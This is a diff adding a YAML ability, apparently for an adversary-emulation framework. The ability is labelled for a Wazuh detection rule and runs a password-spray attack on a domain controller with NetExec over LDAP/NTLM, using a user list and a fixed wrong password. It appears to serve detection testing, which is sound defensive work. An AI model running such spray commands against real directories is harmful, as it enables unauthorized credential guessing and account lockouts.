@@ -1,0 +1,18 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110007] Password Spray usando NetExec (LDAP/NTLM)'
+  description: "Realiza um ataque de Password Spray contra o DC usando uma lista de\
+    \ usu\xE1rios e uma senha fixa, usando o protocolo LDAP com NTLM."
+  tactic: credential-access
+  technique_id: T1110.003
+  technique_name: 'Brute Force: Password Spraying'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - nxc.exe
+    parsers: []
+    command: '.\nxc.exe ldap #{corp.domain.dc}.#{corp.domain} -u $PWD\#{corp.domain.users}
+      -p "#{corp.domain.wrongpass}" -d #{corp.domain}'
+  id: 004179fa-7c4c-4d76-ab05-f6f1cbe0e538
